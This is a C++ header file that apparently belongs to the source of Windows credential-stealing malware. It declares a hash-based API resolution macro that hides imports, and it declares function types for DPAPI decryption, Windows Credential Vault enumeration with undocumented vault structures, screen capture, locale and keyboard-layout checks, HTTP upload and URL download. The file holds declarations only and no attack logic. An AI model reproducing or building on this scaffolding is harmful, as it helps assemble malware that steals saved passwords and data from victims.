#pragma once
#define API_LIMIT 256

#define KERNEL32 0
#define SHELL32 1
#define CRYPT32 2
#define WININET 3
#define ADVAPI32 4
#define GDIPLUS 5
#define GDI32 6
#define USER32 7
#define OLE32 8
#define BCRYPT 9
#define URLMON 10
#define VAULTCLI 11

LPVOID GetApiAddr(HMODULE hDll, UINT nameHash);
LPVOID GetWinAPI(size_t nDll, UINT nameHash);
#define API(nDll, funcName) ((T_##funcName)GetWinAPI(nDll, CRC32_STR(#funcName)))

typedef HMODULE(WINAPI* T_LoadLibraryA)(LPCSTR);
typedef FARPROC(WINAPI* T_GetProcAddress)(HMODULE, LPCSTR);
typedef int(WINAPI* T_MultiByteToWideChar)(UINT,DWORD,LPCCH,int,LPWSTR,int);
typedef int (WINAPI* T_WideCharToMultiByte)(UINT,DWORD,LPCWCH,int,LPSTR,int,LPCCH,LPBOOL);
typedef DWORD(WINAPI* T_GetLogicalDrives)();
typedef BOOL(WINAPI* T_GetVolumeInformationA)(LPCSTR, LPSTR, DWORD, LPDWORD, LPDWORD, LPDWORD, LPSTR, DWORD);
typedef DWORD(WINAPI* T_GetTickCount)();
typedef void(WINAPI* T_Sleep)(DWORD);
typedef HANDLE(WINAPI* T_CreateMutexA)(LPSECURITY_ATTRIBUTES, BOOL, LPCSTR);
typedef DWORD(WINAPI* T_WaitForSingleObject)(HANDLE, DWORD);
typedef BOOL(WINAPI* T_ReleaseMutex)(HANDLE);
typedef BOOL(WINAPI* T_CloseHandle)(HANDLE);
typedef int(WINAPI* T_lstrlenA)(LPCSTR);
typedef int(WINAPI* T_lstrlenW)(LPCWSTR);
typedef HANDLE(WINAPI* T_CreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef DWORD(WINAPI* T_GetFileSize)(HANDLE, LPDWORD);
typedef BOOL(WINAPI* T_ReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef DWORD(WINAPI* T_SetFilePointer)(HANDLE,LONG,PLONG,DWORD);
typedef HANDLE(WINAPI* T_FindFirstFileA)(LPCSTR, LPWIN32_FIND_DATA);
typedef HANDLE (WINAPI* T_FindFirstFileExA)( LPCSTR,FINDEX_INFO_LEVELS,LPVOID,FINDEX_SEARCH_OPS, LPVOID, DWORD);
typedef BOOL(WINAPI* T_GetFileAttributesExA)(LPCSTR, GET_FILEEX_INFO_LEVELS, LPVOID);
typedef BOOL(WINAPI* T_FindNextFileA)(HANDLE, LPWIN32_FIND_DATA);
typedef BOOL(WINAPI* T_FindClose)(HANDLE);
typedef BOOL(WINAPI* T_GetVersionExA)(LPOSVERSIONINFOW);
typedef BOOL(WINAPI* T_IsWow64Process)(HANDLE, PBOOL);
typedef int(WINAPI* T_GetUserDefaultLocaleName)(LPSTR, int);
typedef int(WINAPI* T_GetKeyboardLayoutList)(int, HKL*);
typedef HLOCAL(WINAPI* T_LocalAlloc)(UINT, SIZE_T);
typedef int(WINAPI* T_GetLocaleInfoA)(LCID, LCTYPE, LPSTR, int);
typedef HLOCAL(WINAPI* T_LocalFree)(HLOCAL);
typedef void(WINAPI* T_GetSystemTime)(LPSYSTEMTIME);
typedef BOOL(WINAPI* T_TzSpecificLocalTimeToSystemTime)(const TIME_ZONE_INFORMATION*, const SYSTEMTIME*, LPSYSTEMTIME);
typedef DWORD(WINAPI* T_GetFileAttributesA)(LPCSTR lpFileName);
typedef BOOL(WINAPI* T_CreateDirectoryA)(LPCSTR, LPSECURITY_ATTRIBUTES);
typedef BOOL(WINAPI* T_SetFileAttributesA)(LPCSTR, DWORD);
typedef LANGID(WINAPI* T_GetUserDefaultLangID)();
typedef DWORD(WINAPI* T_GetModuleFileNameA)(HMODULE, LPSTR, DWORD);
typedef BOOL(WINAPI* T_DeleteFileA)(LPCSTR);
typedef BOOL(WINAPI* T_CopyFileA)(LPCSTR, LPCSTR, BOOL);
typedef VOID(WINAPI* T_GetNativeSystemInfo)(LPSYSTEM_INFO);
typedef BOOL(WINAPI* T_VirtualFreeEx)(HANDLE, LPVOID, SIZE_T, DWORD);
typedef BOOL(WINAPI* T_IsBadReadPtr)(const void*, UINT_PTR);
typedef UINT(WINAPI* T_GetSystemDirectoryA)(LPSTR, UINT);
typedef void(WINAPI* T_ExitProcess)(UINT);
typedef HANDLE(WINAPI* T_CreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef HANDLE(WINAPI* T_CreateFileMappingA)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR);
typedef LPVOID(WINAPI* T_MapViewOfFile)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
typedef BOOL(WINAPI* T_UnmapViewOfFile)(LPCVOID);
typedef HANDLE(WINAPI* T_GetCurrentProcess)();
typedef HANDLE(WINAPI* T_GetProcessHeap)();
typedef BOOL(WINAPI* T_FileTimeToSystemTime)(const FILETIME*, LPSYSTEMTIME);
typedef BOOL(WINAPI* T_GetFileInformationByHandle)(HANDLE, LPBY_HANDLE_FILE_INFORMATION);
typedef BOOL(WINAPI* T_WriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef void(WINAPI* T_GetLocalTime)(LPSYSTEMTIME);
typedef BOOL(WINAPI* T_SystemTimeToFileTime)(const SYSTEMTIME*, LPFILETIME);
typedef DWORD(WINAPI* T_GetEnvironmentVariableA)(LPCSTR, LPSTR, DWORD);
typedef HINSTANCE(WINAPI* T_ShellExecuteA)(HWND, LPCSTR, LPCSTR, LPCSTR, LPCSTR, INT);
typedef DPAPI_IMP BOOL(WINAPI* T_CryptUnprotectData)(DATA_BLOB*, LPSTR*, DATA_BLOB*, PVOID, CRYPTPROTECT_PROMPTSTRUCT*, DWORD, DATA_BLOB*);
typedef HINTERNET(WINAPI* T_InternetOpenA)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
typedef BOOL(WINAPI* T_InternetSetOptionA)(HINTERNET, DWORD, LPVOID, DWORD);
typedef HINTERNET(WINAPI* T_InternetConnectA)(HINTERNET, LPCSTR, INTERNET_PORT, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
typedef HINTERNET(WINAPI* T_HttpOpenRequestA)(HINTERNET, LPCSTR, LPCSTR, LPCSTR, LPCSTR, LPCSTR FAR*, DWORD, DWORD_PTR);
typedef BOOL(WINAPI* T_HttpSendRequestA)(HINTERNET, LPCSTR, DWORD, LPVOID, DWORD);
typedef HINTERNET(WINAPI* T_InternetOpenA)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
typedef BOOL(WINAPI* T_InternetSetOptionA)(HINTERNET, DWORD, LPVOID, DWORD);
typedef HINTERNET(WINAPI* T_InternetConnectA)(HINTERNET, LPCSTR, INTERNET_PORT, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
typedef HINTERNET(WINAPI* T_HttpOpenRequestA)(HINTERNET, LPCSTR, LPCSTR, LPCSTR, LPCSTR, LPCSTR FAR*, DWORD, DWORD_PTR);
typedef BOOL(WINAPI* T_HttpSendRequestA)(HINTERNET, LPCSTR, DWORD, LPVOID, DWORD);
typedef BOOL(WINAPI* T_InternetCloseHandle)(HINTERNET);
typedef BOOL(WINAPI* T_InternetReadFile)(HINTERNET, LPVOID, DWORD, LPDWORD);
typedef BOOL(WINAPI* T_DeleteUrlCacheEntryA)(LPCSTR);
typedef LSTATUS(WINAPI* T_RegQueryValueExA)(HKEY, LPCSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
typedef LSTATUS(WINAPI* T_RegEnumKeyA)(HKEY, DWORD, LPSTR, DWORD);
typedef LSTATUS(WINAPI* T_RegOpenKeyA)(HKEY, LPCSTR, PHKEY);
typedef LSTATUS(WINAPI* T_RegCloseKey)(HKEY);
typedef BOOL(WINAPI* T_CryptAcquireContextA)(HCRYPTPROV*, LPCSTR, LPCSTR, DWORD, DWORD);
typedef BOOL(WINAPI* T_CryptImportKey)(HCRYPTPROV, const BYTE*, DWORD, HCRYPTKEY, DWORD, HCRYPTKEY*);
typedef BOOL(WINAPI* T_CryptSetKeyParam)(HCRYPTKEY, DWORD, const BYTE*, DWORD);
typedef BOOL(WINAPI* T_CryptDecrypt)(HCRYPTKEY, HCRYPTHASH, BOOL, DWORD, BYTE*, DWORD*);
typedef BOOL(WINAPI* T_CryptDestroyKey)(HCRYPTKEY hKey);
typedef BOOL(WINAPI* T_CryptReleaseContext)(HCRYPTPROV, DWORD);
typedef LSTATUS(WINAPI* T_RegCreateKeyA)(HKEY, LPCSTR, PHKEY);
typedef LSTATUS(WINAPI* T_RegSetValueExA)(HKEY, LPCSTR, DWORD, DWORD, const BYTE*, DWORD);
typedef Gdiplus::GpStatus(WINAPI* T_GdipGetImageEncodersSize)(UINT*, _Out_ _Out_range_(>= , (*numEncoders) * sizeof(Gdiplus::ImageCodecInfo)) UINT*);
typedef Gdiplus::GpStatus(WINAPI* T_GdipGetImageEncoders)(UINT, UINT, _Out_writes_bytes_(size) Gdiplus::ImageCodecInfo*);
typedef Gdiplus::Status(WINAPI* T_GdiplusStartup)(ULONG_PTR*, const Gdiplus::GdiplusStartupInput*, Gdiplus::GdiplusStartupOutput*);
typedef void(WINAPI* T_GdiplusShutdown)(ULONG_PTR);
typedef void(WINAPI* T_GdipFree)(void*);
typedef void* (WINAPI* T_GdipAlloc)(size_t);
typedef Gdiplus::GpStatus(WINAPI* T_GdipDisposeImage)(Gdiplus::GpImage*);
typedef Gdiplus::GpStatus(WINAPI* T_GdipCloneImage)(Gdiplus::GpImage*, Gdiplus::GpImage**);
typedef Gdiplus::GpStatus(WINAPI* T_GdipSaveImageToStream)(Gdiplus::GpImage*, IStream*, GDIPCONST CLSID*, GDIPCONST Gdiplus::EncoderParameters*);
typedef Gdiplus::GpStatus(WINAPI* T_GdipCreateBitmapFromHBITMAP)(HBITMAP, HPALETTE, Gdiplus::GpBitmap**);
typedef HDC(WINAPI* T_CreateDCA)(LPCSTR, LPCSTR, LPCSTR, CONST DEVMODEW*);
typedef int(WINAPI* T_GetDeviceCaps)(HDC, int);
typedef HDC(WINAPI* T_CreateCompatibleDC)(HDC);
typedef HBITMAP(WINAPI* T_CreateDIBSection)(HDC, CONST BITMAPINFO*, UINT, VOID**, HANDLE, DWORD);
typedef BOOL(WINAPI* T_DeleteDC)(HDC);
typedef int(WINAPI* T_SaveDC)(HDC);
typedef HGDIOBJ(WINAPI* T_SelectObject)(HDC, HGDIOBJ);
typedef BOOL(WINAPI* T_BitBlt)(HDC, int, int, int, int, HDC, int, int, DWORD);
typedef BOOL(WINAPI* T_RestoreDC)(HDC, int);
typedef BOOL(WINAPI* T_DeleteObject)(HGDIOBJ);
typedef BOOL(WINAPI* T_GetMonitorInfoA)(HMONITOR, LPMONITORINFO);
typedef BOOL(WINAPI* T_EnumDisplayDevicesA)(LPCSTR, DWORD, PDISPLAY_DEVICE, DWORD);
typedef int(WINAPI* T_GetSystemMetrics)(int);
typedef BOOL(WINAPI* T_GlobalMemoryStatusEx)(LPMEMORYSTATUSEX);
typedef HDC(WINAPI* T_GetDC)(HWND);
typedef BOOL(WINAPI* T_EnumDisplayMonitors)(HDC, LPCRECT, MONITORENUMPROC, LPARAM);
typedef HWND(WINAPI* T_GetDesktopWindow)(void);
typedef HRESULT(WINAPI* T_CreateStreamOnHGlobal)(HGLOBAL, BOOL, LPSTREAM*);
typedef HRESULT(WINAPI* T_CoInitialize)(LPVOID);
typedef NTSTATUS(WINAPI* T_BCryptOpenAlgorithmProvider)(BCRYPT_ALG_HANDLE*, LPCWSTR, LPCWSTR, ULONG);
typedef NTSTATUS(WINAPI* T_BCryptSetProperty)(BCRYPT_HANDLE, LPCWSTR, PUCHAR, ULONG, ULONG);
typedef NTSTATUS(WINAPI* T_BCryptGenerateSymmetricKey)(BCRYPT_ALG_HANDLE, BCRYPT_KEY_HANDLE*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG);
typedef NTSTATUS(WINAPI* T_BCryptDecrypt)(BCRYPT_KEY_HANDLE, PUCHAR, ULONG, LPVOID, PUCHAR, ULONG, PUCHAR, ULONG, ULONG*, ULONG);
typedef HRESULT(WINAPI* T_URLOpenBlockingStreamA)(LPUNKNOWN, LPCSTR, LPSTREAM*, DWORD, LPBINDSTATUSCALLBACK);
typedef DWORD(WINAPI* T_VaultEnumerateVaults)(DWORD, PDWORD, GUID**);
typedef DWORD(WINAPI* T_VaultOpenVault)(GUID*, DWORD, HANDLE*);
typedef DWORD(WINAPI* T_VaultEnumerateItems)(HANDLE, DWORD, PDWORD, PVOID*);
enum VAULT_SCHEMA_ELEMENT_ID
{
	ElementId_Illegal = 0,
	ElementId_Resource = 1,
	ElementId_Identity = 2,
	ElementId_Authenticator = 3,
	ElementId_Tag = 4,
	ElementId_PackageSid = 5,
	ElementId_AppStart = 0x64,
	ElementId_AppEnd = 0x2710
};

enum VAULT_ELEMENT_TYPE
{
	ElementType_Boolean = 0,
	ElementType_Short = 1,
	ElementType_UnsignedShort = 2,
	ElementType_Integer = 3,
	ElementType_UnsignedInteger = 4,
	ElementType_Double = 5,
	ElementType_Guid = 6,
	ElementType_String = 7,
	ElementType_ByteArray = 8,
	ElementType_TimeStamp = 9,
	ElementType_ProtectedArray = 0xA,
	ElementType_Attribute = 0xB,
	ElementType_Sid = 0xC,
	ElementType_Last = 0xD,
	ElementType_Undefined = 0xFFFFFFFF
};

typedef struct _VAULT_BYTE_BUFFER
{
	DWORD Length;
	PBYTE Value;
} VAULT_BYTE_BUFFER, * PVAULT_BYTE_BUFFER;

typedef struct _VAULT_ITEM_DATA
{
	DWORD SchemaElementId;
	DWORD unk0;
	VAULT_ELEMENT_TYPE Type;
	DWORD unk1;
	union
	{
		BOOL Boolean;
		SHORT Short;
		WORD UnsignedShort;
		LONG Int;
		ULONG UnsignedInt;
		DOUBLE Double;
		GUID Guid;
		LPWSTR String;
		VAULT_BYTE_BUFFER ByteArray;
		VAULT_BYTE_BUFFER ProtectedArray;
		DWORD Attribute;
		DWORD Sid;
	} data;
} VAULT_ITEM_DATA, * PVAULT_ITEM_DATA;

typedef struct _VAULT_ITEM_8
{
	GUID SchemaId;
	PWSTR FriendlyName;
	PVAULT_ITEM_DATA Resource;
	PVAULT_ITEM_DATA Identity;
	PVAULT_ITEM_DATA Authenticator;
	PVAULT_ITEM_DATA PackageSid;
	FILETIME LastWritten;
	DWORD Flags;
	DWORD cbProperties;
	PVAULT_ITEM_DATA Properties;
} VAULT_ITEM, * PVAULT_ITEM;
typedef DWORD(WINAPI* T_VaultGetItem)(HANDLE, LPGUID, PVAULT_ITEM_DATA, PVAULT_ITEM_DATA, PVAULT_ITEM_DATA, HWND, DWORD, PVAULT_ITEM*);
typedef DWORD(WINAPI* T_VaultFree)(PVOID);
typedef DWORD(WINAPI* T_VaultCloseVault)(HANDLE);
typedef BOOL(WINAPI* T_SetCurrentDirectoryA)(LPCSTR);
typedef BOOL(WINAPI* T_FreeLibrary)(HMODULE);
typedef BOOL(WINAPI* T_CreateProcessA)(LPCSTR, LPSTR,LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES,BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef int(WINAPIV* T_wsprintfA)(LPSTR,LPCSTR,...);
typedef HMODULE(WINAPI* T_GetModuleHandleA)(LPCSTR);
typedef BOOL(WINAPI* T_RemoveDirectoryA)(LPCSTR);